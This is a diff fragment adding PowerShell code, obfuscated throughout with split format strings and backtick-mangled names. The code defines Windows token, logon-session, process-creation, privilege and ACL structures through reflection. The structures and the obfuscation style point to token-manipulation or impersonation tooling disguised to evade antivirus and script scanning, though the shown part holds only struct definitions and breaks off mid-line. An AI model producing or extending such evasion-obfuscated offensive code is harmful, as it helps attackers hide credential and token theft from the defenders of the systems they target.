+    ${TYPE`B`UILDer}.("{1}{2}{0}"-f'ield','Def','ineF').Invoke(("{2}{4}{0}{3}{1}" -f'rso','ationLevel','I','n','mpe'), [UInt32], ("{0}{1}" -f 'P','ublic')) | &("{0}{2}{1}"-f'Out-','l','Nul')
+    ${typEB`UiLD`Er}.("{2}{1}{0}" -f 'ield','neF','Defi').Invoke(("{2}{0}{4}{1}{3}" -f 'namic','e','Dy','d','Charg'), [UInt32], ("{1}{0}"-f'lic','Pub')) | &("{2}{1}{0}"-f'l','ut-Nul','O')
+    ${ty`p`e`Builder}.("{1}{2}{0}"-f'Field','Defi','ne').Invoke(("{0}{2}{1}{4}{3}" -f 'D','micA','yna','lable','vai'), [UInt32], ("{0}{2}{1}"-f 'Pu','lic','b')) | &("{1}{0}{2}" -f'ul','Out-N','l')
+    ${TY`PEbUI`LDeR}.("{2}{1}{0}" -f 'd','efineFiel','D').Invoke(("{2}{1}{0}"-f'Count','roup','G'), [UInt32], ("{2}{0}{1}"-f'bl','ic','Pu')) | &("{1}{2}{0}"-f 'ull','Out-','N')
+    ${t`Yp`EB`UiLdEr}.("{3}{0}{2}{1}"-f'fine','eld','Fi','De').Invoke(("{0}{3}{2}{1}"-f 'Privil','nt','geCou','e'), [UInt32], ("{1}{0}" -f'blic','Pu')) | &("{0}{2}{1}" -f 'Out-N','ll','u')
+    ${T`ype`BuIlD`eR}.("{3}{2}{0}{1}"-f'ne','Field','fi','De').Invoke(("{1}{0}{2}" -f'difiedI','Mo','d'), ${lU`Id}, ("{1}{0}"-f'lic','Pub')) | &("{1}{0}"-f 'ut-Null','O')
+	${T`OK`EN`_S`TA`TIsTICS} = ${ty`p`Ebuilder}.("{0}{1}{2}" -f 'Cr','eateT','ype').Invoke()
+
+    
+    ${attRi`But`es} = ("{10}{6}{12}{7}{2}{11}{0}{8}{15}{4}{1}{5}{13}{3}{14}{9}" -f'Pu','ut, Sealed,','s, Cla','reFieldI','quentialLayo',' B','o','siClas','bli','it','AutoLay','ss, ','ut, An','efo','n','c, Se')
+	${T`yP`EBUI`lDer} = ${module`B`UiL`dEr}.("{0}{1}{2}" -f 'Def','i','neType').Invoke(("{1}{4}{2}{3}{0}{5}"-f'STR','L','IC','ODE_','SA_UN','ING'), ${Att`R`IBu`TEs}, [System.ValueType])
+	${tYp`eBu`iLd`Er}.("{1}{0}{2}" -f'fineFi','De','eld').Invoke(("{1}{0}" -f 'th','Leng'), [UInt16], ("{0}{1}" -f 'Publ','ic')) | &("{1}{2}{0}"-f 't-Null','O','u')
+	${T`Y`PE`BUiLDer}.("{0}{1}{2}"-f 'DefineFi','el','d').Invoke(("{0}{1}{2}"-f 'M','aximu','mLength'), [UInt16], ("{1}{0}"-f 'ublic','P')) | &("{2}{1}{0}" -f't-Null','u','O')
+    ${TYPeBU`Ild`Er}.("{1}{0}{2}"-f 'efineF','D','ield').Invoke(("{0}{1}" -f'Buffe','r'), [IntPtr], ("{2}{0}{1}"-f 'bl','ic','Pu')) | &("{0}{1}{2}"-f'Ou','t-Nul','l')
+	${L`sa`_uNIcOd`e_S`TRiNg} = ${T`y`p`eBuIldER}.("{0}{1}{2}"-f'CreateT','yp','e').Invoke()
+
+    
+    ${att`RI`B`UTES} = ("{19}{3}{2}{1}{5}{8}{7}{10}{20}{16}{15}{12}{21}{17}{14}{4}{11}{13}{18}{9}{22}{0}{6}{23}" -f 'Field','yout, Ans','oLa','ut','ut, S','iC','I','l','lass, C','ed, Bef','ass, P','e','ia','a','yo','Sequent',', ','La','l','A','ublic','l','ore','nit')
+	${t`ypE`BuIld`er} = ${mOdUlE`BUi`LD`eR}.("{0}{2}{1}"-f 'De','Type','fine').Invoke(("{3}{2}{0}{5}{6}{7}{1}{4}"-f '_LA','GON','A','LS','_INFO','ST_I','NTER_L','O'), ${aTtRi`B`UT`es}, [System.ValueType])
+	${TY`PeB`Uil`DER}.("{2}{0}{1}" -f 'efi','neField','D').Invoke(("{2}{4}{3}{0}{1}"-f'ssfulL','ogon','Last','cce','Su'), ${LArGe`_I`Nt`EGER}, ("{1}{0}{2}"-f 'l','Pub','ic')) | &("{1}{0}{2}" -f 't-','Ou','Null')
+	${tYPe`B`UI`lDEr}.("{2}{3}{1}{0}"-f'd','iel','Def','ineF').Invoke(("{3}{0}{1}{4}{2}"-f'i','le','Logon','LastFa','d'), ${lA`Rg`E_I`NteGer}, ("{0}{1}"-f'Pu','blic')) | &("{1}{2}{0}"-f'ull','O','ut-N')
+    ${TYp`EbU`i`ldeR}.("{3}{1}{2}{0}" -f 'ield','n','eF','Defi').Invoke(("{3}{1}{5}{2}{4}{8}{7}{6}{0}"-f'ulLogon','ailedAttempt','untSinceLastSucc','F','e','Co','f','s','s'), [UInt32], ("{0}{1}"-f 'Pu','blic')) | &("{2}{1}{0}" -f 'Null','ut-','O')
+	${L`sA_LA`st_In`Te`R_lO`G`o`N_Info} = ${ty`PEBuIL`der}.("{1}{0}{2}" -f 'teTy','Crea','pe').Invoke()
+
+    
+    ${aTTr`ibuT`Es} = ("{1}{6}{12}{9}{5}{13}{0}{8}{10}{14}{7}{4}{3}{11}{2}"-f'ass, Class, Publi','AutoLayout,','foreFieldInit','led,','ut, Sea','iC',' ','lLayo','c, ','s','Seque',' Be','An','l','ntia')
+	${TypE`B`U`IldEr} = ${MODule`B`UI`l`der}.("{1}{2}{0}"-f'Type','De','fine').Invoke(("{1}{0}{4}{3}{2}"-f'TY','SECURI','N_SESSION_DATA','LOGO','_'), ${aT`TRIB`UTeS}, [System.ValueType])
+	${tYPEB`UIl`dER}.("{0}{1}{2}"-f 'Defin','eFi','eld').Invoke(("{0}{1}"-f 'S','ize'), [UInt32], ("{1}{0}" -f'blic','Pu')) | &("{0}{1}{2}"-f'Out','-N','ull')
+	${tY`pEb`U`ILdeR}.("{1}{3}{2}{0}" -f 'Field','De','ine','f').Invoke(("{1}{0}" -f 'oginID','L'), ${lU`id}, ("{1}{0}{2}"-f 'b','Pu','lic')) | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
+    ${t`yPE`Bui`LDer}.("{0}{2}{1}{3}" -f'Defin','ie','eF','ld').Invoke(("{0}{1}" -f'Usern','ame'), ${lsa_u`NiCOD`E`_sTr`iNg}, ("{1}{0}" -f 'c','Publi')) | &("{1}{2}{0}" -f'ull','O','ut-N')
+    ${T`yp`eBUiLdEr}.("{2}{0}{1}"-f'iel','d','DefineF').Invoke(("{1}{2}{3}{0}"-f 'main','Logi','nD','o'), ${LsA_unIC`ODE`_S`TR`iNG}, ("{0}{1}" -f 'Pu','blic')) | &("{0}{2}{1}" -f'O','-Null','ut')
+    ${tYp`e`B`UILder}.("{1}{2}{0}{3}" -f 'el','DefineF','i','d').Invoke(("{1}{3}{0}{4}{2}{5}"-f'n','A','ation','uthe','tic','Package'), ${L`s`A_UniC`O`de_STriNG}, ("{2}{1}{0}" -f'c','li','Pub')) | &("{0}{2}{1}"-f 'Ou','Null','t-')
+    ${t`yPEbuiL`DeR}.("{1}{0}{2}"-f 'Fiel','Define','d').Invoke(("{0}{2}{1}"-f'LogonTy','e','p'), [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{1}{0}{2}"-f'u','Out-N','ll')
+    ${Typeb`UIl`DeR}.("{3}{2}{1}{0}" -f 'eld','i','efineF','D').Invoke(("{1}{0}" -f 'ession','S'), [UInt32], ("{1}{0}"-f'c','Publi')) | &("{1}{0}"-f '-Null','Out')
+    ${TYp`EbUi`Lder}."deF`iN`efiELD"('Sid', [IntPtr], ("{0}{1}"-f'Publi','c')) | &("{1}{0}{2}"-f't-N','Ou','ull')
+    ${TYp`ebuI`l`Der}.("{2}{1}{3}{0}"-f'd','fi','De','neFiel').Invoke(("{3}{0}{2}{1}"-f 'i','Time','n','Log'), ${L`ARge`_iNteGEr}, ("{1}{0}"-f'c','Publi')) | &("{0}{1}{2}" -f'O','u','t-Null')
+    ${tyP`E`BUILDer}.("{2}{1}{0}" -f'ld','efineFie','D').Invoke(("{2}{3}{1}{0}" -f 'er','v','Logi','nSer'), ${Ls`A_Un`Ic`oDE`_sTrINg}, ("{0}{1}"-f 'Pu','blic')) | &("{2}{1}{0}" -f 'ull','t-N','Ou')
+    ${tY`Pe`BUI`ldEr}.("{3}{2}{1}{0}" -f'Field','ine','ef','D').Invoke(("{3}{2}{1}{0}" -f 'nName','mai','sDo','Dn'), ${lsA_UNICoD`E_`sT`RIng}, ("{1}{0}"-f'blic','Pu')) | &("{1}{0}"-f'l','Out-Nul')
+    ${tYpEbUI`L`DeR}.("{0}{1}{2}"-f 'DefineF','i','eld').Invoke('Upn', ${LsA_U`NiCODE_`S`Tr`i`Ng}, ("{1}{0}" -f'lic','Pub')) | &("{1}{0}{2}"-f't-','Ou','Null')
+    ${TyPe`B`UIl`der}.("{2}{0}{1}{3}" -f'efineF','ie','D','ld').Invoke(("{1}{2}{0}"-f'gs','UserFl','a'), [UInt32], ("{1}{2}{0}" -f 'c','Publ','i')) | &("{2}{1}{0}"-f 'll','t-Nu','Ou')
+    ${TYPe`B`UIL`DEr}.("{2}{1}{0}" -f 'ineField','f','De').Invoke(("{1}{2}{0}" -f 'ogonInfo','Last','L'), ${L`Sa_L`Ast`_INteR_`LOg`ON_i`NFo}, ("{0}{1}" -f 'Publi','c')) | &("{1}{0}{2}"-f'Nul','Out-','l')
+    ${T`Yp`eBUIl`der}.("{2}{1}{0}"-f 'd','fineFiel','De').Invoke(("{0}{1}{2}" -f'L','ogonSc','ript'), ${L`Sa_unicOd`E`_`s`TRING}, ("{0}{1}{2}" -f'P','u','blic')) | &("{2}{1}{0}" -f 'l','l','Out-Nu')
+    ${TY`pe`BUi`ldEr}.("{1}{2}{0}{3}"-f'in','De','f','eField').Invoke(("{2}{1}{0}"-f'ath','rofileP','P'), ${lS`A_u`Nicod`E`_St`Ring}, ("{1}{0}{2}" -f'ubl','P','ic')) | &("{1}{2}{0}" -f 'll','O','ut-Nu')
+    ${TYp`eb`UIlDER}.("{1}{0}{2}" -f 'neF','Defi','ield').Invoke(("{0}{2}{1}"-f 'H','ectory','omeDir'), ${LSa_uN`iCO`DE_`STRI`NG}, ("{2}{0}{1}" -f 'li','c','Pub')) | &("{2}{1}{0}" -f 'll','u','Out-N')
+    ${Ty`peb`UildER}.("{1}{0}{2}" -f 'fineFiel','De','d').Invoke(("{2}{0}{4}{3}{1}"-f 'ir','oryDrive','HomeD','t','ec'), ${ls`A_uniC`Od`e_`StRI`NG}, ("{1}{0}"-f'ic','Publ')) | &("{2}{1}{0}"-f'll','t-Nu','Ou')
+    ${t`YPE`BuIl`DeR}.("{2}{3}{0}{1}" -f'el','d','Defin','eFi').Invoke(("{1}{0}{2}" -f 'of','Log','fTime'), ${lARgE_`INT`EgeR}, ("{1}{0}"-f'c','Publi')) | &("{1}{0}{2}" -f 't-N','Ou','ull')
+    ${t`YPebuI`lD`ER}.("{1}{0}{2}" -f'e','DefineFi','ld').Invoke(("{1}{0}{2}" -f 'ckOffTim','Ki','e'), ${Large_I`N`T`EGER}, ("{1}{0}"-f'ic','Publ')) | &("{1}{0}{2}"-f 'ut-N','O','ull')
+    ${Ty`p`eBu`ILdER}.("{2}{0}{1}{3}"-f 'in','e','Def','Field').Invoke(("{4}{3}{2}{1}{0}" -f 'Set','st','a','rdL','Passwo'), ${LArge`_`In`TEg`Er}, ("{1}{0}"-f'blic','Pu')) | &("{2}{0}{1}"-f 't-Nul','l','Ou')
+    ${tyPe`BU`iLd`Er}.("{2}{0}{1}" -f 'eFi','eld','Defin').Invoke(("{0}{4}{3}{2}{1}"-f'Pa','Change','an','C','ssword'), ${la`RG`E_inTeger}, ("{0}{1}"-f'Publi','c')) | &("{1}{2}{0}" -f'll','Ou','t-Nu')
+    ${t`ypEBuI`L`dER}.("{1}{0}{2}{3}"-f'ef','D','i','neField').Invoke(("{2}{0}{1}{4}{3}"-f'rd','Mus','Passwo','ange','tCh'), ${LaR`GE_`I`NTEGER}, ("{0}{1}{2}"-f 'Pu','bl','ic')) | &("{1}{2}{0}"-f'l','Ou','t-Nul')
+	${Se`cURItY`_LoGon_SeSSiOn`_`DAta} = ${tyP`E`BUiLD`eR}.("{2}{1}{0}"-f 'Type','eate','Cr').Invoke()
+
+    
+    ${AT`Trib`U`TeS} = ("{0}{7}{1}{13}{5}{12}{9}{3}{11}{10}{4}{6}{8}{2}" -f'Auto','ass,','it','al','o','Pub','reFieldI','Layout, AnsiClass, Cl','n','t, Se','Bef','ed, ','lic, SequentialLayou',' ')
+	${t`ypEBU`I`LDer} = ${MoD`U`leBuI`lDeR}.("{0}{1}{2}" -f'D','efineTy','pe').Invoke(("{2}{1}{0}"-f 'NFO','TARTUPI','S'), ${aTTr`I`Bu`TeS}, [System.ValueType])
+	${t`YPeBuild`ER}."dEF`INEFi`E`LD"('cb', [UInt32], ("{1}{0}" -f'ic','Publ')) | &("{1}{0}" -f'l','Out-Nul')
+	${TyPe`BU`IL`dEr}.("{0}{2}{1}"-f 'Defi','eld','neFi').Invoke(("{0}{1}{2}" -f 'lpR','eserv','ed'), [IntPtr], ("{1}{0}"-f 'c','Publi')) | &("{0}{2}{1}"-f 'Out-','l','Nul')
+    ${typ`eb`Uil`DEr}.("{2}{3}{0}{1}"-f 'Fi','eld','D','efine').Invoke(("{0}{1}{2}"-f'lpDesk','to','p'), [IntPtr], ("{0}{1}"-f'Pu','blic')) | &("{0}{1}"-f 'Out-N','ull')
+    ${t`yPe`BUilD`eR}.("{0}{3}{1}{2}" -f 'DefineF','e','ld','i').Invoke(("{2}{1}{0}"-f'tle','pTi','l'), [IntPtr], ("{1}{0}" -f 'ublic','P')) | &("{0}{2}{1}" -f'Out-N','l','ul')
+    ${tYpeb`UiLD`ER}."defIne`Fi`ELd"('dwX', [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{0}{1}" -f 'O','ut-Null')
+    ${tY`pebu`I`ldeR}."D`efIneFi`Eld"('dwY', [UInt32], ("{0}{1}"-f 'P','ublic')) | &("{2}{0}{1}"-f 'Nu','ll','Out-')
+    ${TYp`eBU`ildeR}.("{2}{3}{0}{1}" -f'eF','ield','Defi','n').Invoke(("{0}{1}"-f'dwXSi','ze'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{0}{2}{1}" -f'Ou','-Null','t')
+    ${t`Y`peBuiL`DEr}.("{1}{2}{0}"-f'ield','D','efineF').Invoke(("{0}{2}{1}" -f 'dwY','ze','Si'), [UInt32], ("{1}{0}"-f'c','Publi')) | &("{0}{1}" -f 'Out-Nul','l')
+    ${t`y`PE`BUIlDER}.("{2}{0}{1}" -f 'neF','ield','Defi').Invoke(("{2}{3}{0}{1}" -f 'ntCha','rs','dwXCo','u'), [UInt32], ("{1}{0}"-f'lic','Pub')) | &("{0}{2}{1}" -f 'O','l','ut-Nul')
+    ${tYP`e`BuIL`DEr}.("{0}{3}{2}{1}"-f'De','ld','e','fineFi').Invoke(("{1}{2}{3}{0}"-f 's','dwYCo','untC','har'), [UInt32], ("{0}{1}" -f 'Publ','ic')) | &("{0}{2}{1}" -f'Ou','ull','t-N')
+    ${T`YPebUiLd`eR}.("{1}{2}{0}" -f'ld','Defin','eFie').Invoke(("{1}{2}{3}{4}{0}"-f 'bute','d','w','FillAtt','ri'), [UInt32], ("{1}{0}" -f'blic','Pu')) | &("{1}{0}{2}"-f'u','Out-N','ll')
+    ${typEBU`i`ld`Er}.("{0}{2}{1}"-f'Def','eld','ineFi').Invoke(("{1}{0}"-f 'ags','dwFl'), [UInt32], ("{0}{1}" -f 'P','ublic')) | &("{1}{0}{2}"-f '-','Out','Null')
+    ${T`YP`EBuILd`ER}.("{0}{2}{1}"-f 'D','fineField','e').Invoke(("{2}{1}{3}{0}" -f'indow','Sho','w','wW'), [UInt16], ("{1}{0}" -f 'ublic','P')) | &("{2}{1}{0}"-f'ull','N','Out-')
+    ${TY`PE`BUiLDeR}.("{1}{0}{2}"-f'eFiel','Defin','d').Invoke(("{2}{0}{1}" -f'bReserve','d2','c'), [UInt16], ("{0}{1}{2}" -f 'Publ','i','c')) | &("{1}{0}" -f 'ull','Out-N')
+    ${Type`BU`iLD`eR}.("{2}{0}{1}{3}"-f'i','neFie','Def','ld').Invoke(("{0}{2}{1}"-f 'l','eserved2','pR'), [IntPtr], ("{1}{0}"-f 'ic','Publ')) | &("{0}{1}{2}"-f 'Out-Nu','l','l')
+    ${tyPeb`U`i`LdER}.("{0}{3}{2}{1}" -f 'D','ld','e','efineFi').Invoke(("{0}{1}" -f'h','StdInput'), [IntPtr], ("{1}{0}"-f 'ublic','P')) | &("{1}{0}{2}"-f 'u','Out-N','ll')
+    ${T`Y`pEBUilDER}.("{3}{2}{1}{0}"-f 'ield','F','ne','Defi').Invoke(("{2}{0}{1}"-f't','put','hStdOu'), [IntPtr], ("{1}{0}"-f'ic','Publ')) | &("{0}{2}{1}" -f'O','Null','ut-')
+    ${Ty`p`E`BuildER}.("{1}{0}{2}" -f 'ineFi','Def','eld').Invoke(("{0}{1}" -f 'hS','tdError'), [IntPtr], ("{0}{1}" -f'Publi','c')) | &("{0}{1}"-f 'Ou','t-Null')
+	${sTAR`T`U`pINFo} = ${t`Yp`E`BUIlDER}.("{1}{0}{3}{2}"-f 'rea','C','e','teTyp').Invoke()
+
+    
+    ${AT`TrI`BUtEs} = ("{1}{13}{15}{10}{2}{11}{6}{3}{14}{5}{8}{12}{16}{7}{0}{9}{18}{4}{17}"-f' S','AutoLayo','la','as','d',', Se','s, Cl','Layout,','quen','ealed, Before','nsiC','s','ti','ut','s, Public',', A','al','Init','Fiel')
+	${Ty`PEbui`ldER} = ${M`O`dU`LEbUI`lDEr}.("{2}{1}{0}"-f 'eType','in','Def').Invoke(("{0}{2}{1}{3}" -f 'PROCES','INFORM','S_','ATION'), ${ATt`RiB`UtES}, [System.ValueType])
+	${Typ`ebuI`L`Der}.("{2}{1}{3}{0}" -f'eld','efi','D','neFi').Invoke(("{0}{1}{2}" -f 'h','Pro','cess'), [IntPtr], ("{2}{0}{1}"-f 'bl','ic','Pu')) | &("{2}{0}{1}"-f'ul','l','Out-N')
+	${T`Y`PE`BuildEr}.("{0}{1}{2}"-f 'Define','Fie','ld').Invoke(("{0}{1}"-f'hT','hread'), [IntPtr], ("{2}{1}{0}" -f 'ic','l','Pub')) | &("{0}{1}"-f'Out-','Null')
+    ${t`yP`EbUilD`ER}.("{1}{2}{3}{0}" -f'd','De','fi','neFiel').Invoke(("{1}{0}{2}"-f 'Proces','dw','sId'), [UInt32], ("{1}{0}{2}" -f'i','Publ','c')) | &("{1}{0}{2}"-f 't-Nul','Ou','l')
+    ${T`Y`PEBuild`Er}.("{3}{2}{1}{0}"-f 'eld','Fi','ne','Defi').Invoke(("{3}{2}{0}{1}" -f're','adId','Th','dw'), [UInt32], ("{0}{1}" -f 'P','ublic')) | &("{1}{0}{2}"-f 'N','Out-','ull')
+	${proc`ESS_iNfO`R`matI`on} = ${tY`P`E`BUilDEr}.("{0}{1}{2}" -f'Creat','eTy','pe').Invoke()
+
+    
+    ${aTT`Ri`BUteS} = ("{11}{6}{7}{9}{1}{8}{5}{4}{10}{3}{0}{2}{12}" -f'ealed, Before','ic, Se','Field','ut, S','tialLa','n','ayout, An','siClass, Class, P','que','ubl','yo','AutoL','Init')
+	${typEB`U`IlDEr} = ${MoDu`LEb`U`iLder}.("{0}{2}{1}" -f'De','pe','fineTy').Invoke(("{3}{0}{1}{2}"-f 'EN_EL','EVAT','ION','TOK'), ${Att`RIB`Ut`ES}, [System.ValueType])
+	${Ty`PebuI`lDer}.("{2}{0}{1}" -f 'l','d','DefineFie').Invoke(("{2}{3}{0}{1}"-f'nIsE','levated','T','oke'), [UInt32], ("{1}{2}{0}" -f 'lic','P','ub')) | &("{1}{2}{0}"-f '-Null','O','ut')
+	${tOK`E`N_`e`LE`VaTiOn} = ${tyPE`B`UILD`Er}.("{2}{1}{0}"-f 'e','ateTyp','Cre').Invoke()
+
+    
+    ${AT`TR`IBuTEs} = ("{12}{11}{10}{14}{6}{1}{2}{0}{13}{4}{9}{7}{8}{3}{5}" -f'n','si','Class, Class, Public, Seque','reFie','ialL','ldInit','An','d, Bef','o','ayout, Seale','La','to','Au','t','yout, ')
+    ${TYPeb`UiL`DeR} = ${M`Od`U`lebU`iLdER}.("{1}{0}{3}{2}" -f'i','Def','e','neTyp').Invoke(("{1}{3}{2}{4}{0}"-f 'S','L','D_AND_ATTRI','UI','BUTE'), ${aT`TrIbu`TES}, [System.ValueType], 12)
+    ${tyPE`B`UILDEr}.("{1}{2}{0}" -f 'ld','D','efineFie').Invoke(("{1}{0}"-f 'id','Lu'), ${l`UID}, ("{1}{0}" -f 'blic','Pu')) | &("{1}{2}{0}"-f 'l','Ou','t-Nul')
+    ${Type`BuiLd`eR}.("{0}{2}{1}{3}" -f'D','ineFiel','ef','d').Invoke(("{1}{2}{0}"-f 'es','Attr','ibut'), [UInt32], ("{0}{1}"-f 'Publi','c')) | &("{1}{2}{0}" -f 'ull','Out','-N')
+    ${L`UID_AN`D_ATTr`IbUtEs} = ${tyPe`BuIL`DEr}.("{2}{1}{0}{3}" -f'eate','r','C','Type').Invoke()
+		
+    
+    ${a`TTrIbuT`Es} = ("{6}{14}{17}{8}{18}{19}{4}{7}{2}{12}{5}{13}{9}{10}{15}{3}{1}{16}{11}{0}" -f'it',' Befo',' Pu','yout, Sealed,',', Class','c','AutoLayo',',',', AnsiCl','e','quen','FieldIn','bli',', S','u','tialLa','re','t','a','ss')
+    ${tyPe`BU`Il`deR} = ${mo`D`UleBUi`LD`er}.("{0}{3}{1}{2}" -f 'De','in','eType','f').Invoke(("{2}{1}{3}{0}{4}"-f 'IVILEGE','OKEN','T','_PR','S'), ${A`Ttri`BU`TES}, [System.ValueType], 16)
+    ${ty`p`Eb`UIlDER}.("{3}{0}{1}{2}"-f 'eFi','e','ld','Defin').Invoke(("{0}{2}{1}" -f 'Pr','Count','ivilege'), [UInt32], ("{1}{0}"-f 'c','Publi')) | &("{0}{1}{2}"-f 'Out','-N','ull')
+    ${T`YPeBUI`lDEr}.("{1}{0}{2}{3}"-f'efin','D','e','Field').Invoke(("{2}{1}{0}"-f'eges','l','Privi'), ${LUID`_A`N`d_AttrI`Bu`Tes}, ("{0}{1}"-f 'Publ','ic')) | &("{2}{1}{0}" -f'l','l','Out-Nu')
+    ${tOK`en_PrIV`I`LEges} = ${ty`PEB`Uil`DER}.("{2}{1}{0}"-f'e','eTyp','Creat').Invoke()
+
+    
+    ${AtTRIBu`T`ES} = ("{0}{12}{6}{20}{13}{8}{18}{14}{9}{5}{7}{1}{17}{10}{11}{3}{19}{16}{2}{15}{4}" -f 'AutoL','b','reFiel','entialLayo','nit','s, P',', A','u','a','Clas',', ','Sequ','ayout','iCl',', ','dI','efo','lic','ss','ut, Sealed, B','ns')
+    ${tyP`EBUI`L`DER} = ${m`oD`U`lEBu`IldEr}.("{1}{2}{0}" -f'ype','Def','ineT').Invoke(("{0}{2}{1}" -f 'A','E_HEADER','C'), ${aT`TrIBu`Tes}, [System.ValueType])
+    ${ty`PEBuI`ldEr}.("{2}{3}{1}{0}" -f'ield','fineF','D','e').Invoke(("{0}{1}"-f'AceT','ype'), [Byte], ("{1}{0}"-f'blic','Pu')) | &("{0}{2}{1}" -f 'Out-N','l','ul')
+    ${tYpe`BUiL`der}.("{2}{1}{0}" -f'd','iel','DefineF').Invoke(("{0}{2}{1}"-f 'AceF','ags','l'), [Byte], ("{1}{0}"-f 'lic','Pub')) | &("{2}{0}{1}" -f't','-Null','Ou')
+    ${T`Yp`ebU`ilDEr}.("{1}{2}{0}"-f 'd','Defi','neFiel').Invoke(("{0}{1}"-f'Ace','Size'), [UInt16], ("{1}{0}{2}"-f 'ubli','P','c')) | &("{0}{1}{2}" -f 'Out-','N','ull')
+    ${AcE_Hea`D`er} = ${TYP`e`BuiLd`er}.("{2}{1}{0}"-f'pe','eateTy','Cr').Invoke()
+
+    
+    ${AT`Tr`iBuTES} = ("{0}{5}{1}{15}{12}{13}{6}{17}{7}{9}{8}{14}{2}{3}{4}{10}{11}{16}{18}" -f 'AutoL','o',', Be','f','o','ay','ubli',', Sequent','alL','i','r','eF','iC','lass, Class, P','ayout, Sealed','ut, Ans','ieldIn','c','it')
+    ${tYpeb`Uil`d`ER} = ${Mo`Duleb`UI`Ld`ER}."de`Fi`NETY`PE"('ACL', ${at`TrI`BU`Tes}, [System.ValueType])
+    ${Type`B`UIl`DeR}.("{3}{0}{1}{2}"-f'i','neF','ield','Def').Invoke(("{2}{1}{3}{0}"-f 'on','lRev','Ac','isi'), [Byte], ("{0}{1}"-f 'Publi','c')) | &("{1}{0}{2}" -f't','Ou','-Null')
+    ${tyPE`Bu`Ild`er}.("{1}{2}{0}"-f 'eld','Defin','eFi').Invoke(("{0}{1}"-f 'S','bz1'), [Byte], ("{2}{0}{1}" -f 'l','ic','Pub')) | &("{1}{0}{2}" -f 't-Nu','Ou','ll')
+    ${tYpebuiL`d`ER}.("{3}{0}{2}{1}"-f 'fine','d','Fiel','De').Invoke(("{0}{2}{1}"-f'Acl','ze','Si'), [UInt16], ("{0}{1}" -f'Pub','lic')) | &("{0}{2}{1}"-f 'O','l','ut-Nul')
+    ${tYpe`BU`ilDEr}.("{3}{1}{2}{0}"-f 'd','fi','neFiel','De').Invoke(("{0}{1}"-f'AceCou','nt'), [UInt16], ("{0}{1}" -f'Pub','lic')) | &("{1}{0}" -f'ull','Out-N')
+    ${Type`Bu`iLDEr}.("{2}{0}{1}" -f 'efi','neField','D').Invoke(("{1}{0}"-f'z2','Sb'), [UInt16], ("{1}{0}" -f 'c','Publi')) | &("{0}{1}{2}"-f 'Out','-Nul','l')
+    ${a`cl} = ${tYPE`BU`iLDer}.("{0}{1}{2}"-f'Cr','eate','Type').Invoke()
+
+    
+    ${ATT`R`iBUt`Es} = ("{9}{18}{10}{21}{23}{2}{7}{5}{20}{11}{4}{17}{6}{8}{3}{1}{0}{15}{16}{19}{12}{22}{14}{13}"-f 'e','al','ublic,',' Se','i','e','yo',' S','ut,','AutoLayout, ','nsiClas','nt','ield','t','i','d, ','Be','alLa','A','foreF','que','s, Class, ','In','P')
+    ${tYpEBUI`L`d`eR} = ${Mo`DULeb`UiLDER}.("{2}{3}{0}{1}"-f 'e','Type','Def','in').Invoke(("{2}{1}{3}{0}" -f 'D_ACE','CES','AC','S_ALLOWE'), ${a`TTRI`ButES}, [System.ValueType])
+    ${Typ`E`B`UIlDER}.("{0}{1}{2}"-f'DefineF','i','eld').Invoke(("{0}{1}" -f 'H','eader'), ${A`Ce_H`E`AdeR}, ("{0}{1}{2}" -f 'Pu','b','lic')) | &("{2}{1}{0}" -f 'l','t-Nul','Ou')
+    ${tyPEb`UiL`D`Er}.("{0}{2}{3}{1}"-f'Def','d','ineFi','el').Invoke(("{0}{1}" -f'M','ask'), [UInt32], ("{1}{0}" -f 'c','Publi')) | &("{0}{1}{2}"-f'Out','-Nul','l')
+    ${tYpE`BU`IldER}.("{1}{2}{0}"-f'eld','D','efineFi').Invoke(("{0}{2}{1}" -f 'S','Start','id'), [UInt32], ("{0}{1}" -f'Publ','ic')) | &("{1}{0}{2}"-f'-Nul','Out','l')
+    ${AcCeSs_aLLO`w`E`D_ace} = ${Type`BUI`L`Der}.("{2}{1}{0}" -f'Type','te','Crea').Invoke()
+
+    
+    ${aTT`RIb`UTEs} = ("{20}{8}{22}{1}{21}{17}{11}{9}{12}{10}{16}{5}{14}{2}{7}{23}{6}{19}{15}{13}{3}{4}{0}{18}"-f'Ini','Layout, An','Lay','iel','d','Seq','Se','out','u',', C','blic','Class','lass, Pu','eF','uential','for',', ','i','t','aled, Be','A','s','to',', ')
+    ${t`YPeB`UiLd`er} = ${ModuLE`B`Ui`lder}.("{0}{1}{2}" -f'De','fineTy','pe').Invoke(("{0}{2}{1}"-f 'TR','STEE','U'), ${ATt`RI`BuT`ES}, [System.ValueType])
+    ${t`Ype`Bu`IlDeR}.("{3}{1}{0}{2}"-f 'eFi','efin','eld','D').Invoke(("{0}{1}{2}"-f'pMultipl','eT','rustee'), [IntPtr], ("{1}{2}{0}"-f'ic','Pub','l')) | &("{0}{1}"-f 'O','ut-Null')
+    ${tYpeB`Uil`DeR}.("{2}{0}{1}{3}"-f 'fi','neFiel','De','d').Invoke(("{0}{4}{3}{1}{2}" -f'Mul','eOperatio','n','eTruste','tipl'), [UInt32], ("{0}{1}"-f 'Publi','c')) | &("{0}{1}" -f'Out-N','ull')
+    ${TyPEB`U`IldER}.("{0}{1}{3}{2}"-f'D','efi','eField','n').Invoke(("{0}{1}{2}{3}"-f'Tru','s','teeFo','rm'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{0}{2}{1}"-f'Out','Null','-')
+    ${tYpEB`UIld`eR}.("{0}{1}{2}" -f'Define','Fie','ld').Invoke(("{0}{2}{1}" -f'Trust','Type','ee'), [UInt32], ("{1}{2}{0}" -f'ic','P','ubl')) | &("{0}{1}{2}"-f'O','ut-Nu','ll')
+    ${Ty`PEb`UIL`DeR}.("{0}{2}{1}"-f'Def','eld','ineFi').Invoke(("{1}{0}"-f 'Name','ptstr'), [IntPtr], ("{1}{0}"-f 'c','Publi')) | &("{2}{1}{0}"-f 'ull','t-N','Ou')
+    ${tru`sT`eE} = ${Ty`pebU`ILDER}.("{1}{0}{2}" -f'at','Cre','eType').Invoke()
+
+    
+    ${att`R`iBuTeS} = ("{6}{0}{10}{7}{5}{3}{1}{11}{8}{4}{2}{13}{9}{12}{14}{15}" -f'o','s, C',', Seq','las','ic','ut, AnsiC','Aut','ayo',', Publ','out, ','L','lass','Sealed,','uentialLay',' BeforeF','ieldInit')
